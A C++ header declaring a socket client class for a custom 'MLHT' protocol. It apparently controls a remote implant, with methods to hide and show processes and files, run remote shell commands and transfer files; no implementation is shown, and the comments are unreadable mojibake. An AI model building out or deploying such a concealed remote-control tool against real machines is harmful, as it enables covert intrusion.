#include"MLHT.h"
#include<stdio.h>


#define IP_ADDRESS_LENGTH 16
#define SOCKET_BUFFER_SIZE (MLHT_MAX_LENGTH + 1)


//���Ľ��շ���ֵ
#define PACKET_ACCEPT_SUCCESS	0
#define PACKET_ACCEPT_FAIL		1
#define FILE_OPEN_FAIL			2

#define FILE_READ_FAIL			3
#define FILE_WRITE_FAIL			4

#define OP_SUCCESS				5
#define OP_FAIL					6

#define NOT_GET_ACK				7
#define GET_ACK					8

#define FILE_TOO_LARGE			9

#define SOMETHINGWRONG			-2


class MLHT_CLIENT
{
public:

	WSADATA wsaData;
	SOCKET s;
	sockaddr_in sockaddr;
	char server_ip[IP_ADDRESS_LENGTH];	//������IP
	int server_port;					//�����������˿�

	char buffer[MLHT_MAX_LENGTH];

	WORD IDtt;		//����ID
	
	MLHT *p_send;	//��һ�������ı���
	MLHT *p_get;	//��һ���յ��ı���

public:
	MLHT_CLIENT(char* ip,int port);	//��ʼ���ͻ���

	bool ConnectServer();			//���ӷ����
	bool CloseSocket();				//�Ͽ�����

	int WaitReturnPacket();			//�ȴ����ر��ģ���ⷵ�ر����Ƿ�Ϸ�
	int WaitForAckPacket();			//�ȴ�ACK���ر���

	void SendPacket(WORD mtu_type);	//���޲�������
	void SendACKPacket();			//��ACK���ر���
	void SendFINPacket();			//��FIN���ر���
	void SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength);//������������

	bool IsAckPacket();
	bool IsFinPacket();
	bool IsReturnPacket();


	//�����ļ���
	int SendFilePacket(
		WORD mtu_type,				//�ļ�����Э������
		FILE *fp,					//�������ļ���ָ��
		int contentlen				//�ļ�����
		);

	//�����ļ���
	int GetFilePacket(
		FILE *fp					//����Ŀ���ļ���ָ��
		);

	//���̲���
	int ShowProcess();
	int HideProcess();

	//�ļ�����
	int ShowFile();
	int HideFile();

	//Shell����
	int ShellLs(char* filedir);
	int ShellMkdir(char* filedir);
	int ShellRmdir(char* filedir);
	int ShellRm(char* filename);

	//�ϴ��ļ�
	int UpLoadFile(
		char*srcfiledir, //�ϴ���Դ�ļ�·��
		char*desfiledir  //�ϴ���Ŀ���ļ�·��
		);

	//�����ļ�
	int DownLoadFile(
		char*srcfiledir,//�����ļ�·��
		char*desfiledir //�浽�ı���Ŀ¼·��
		);

};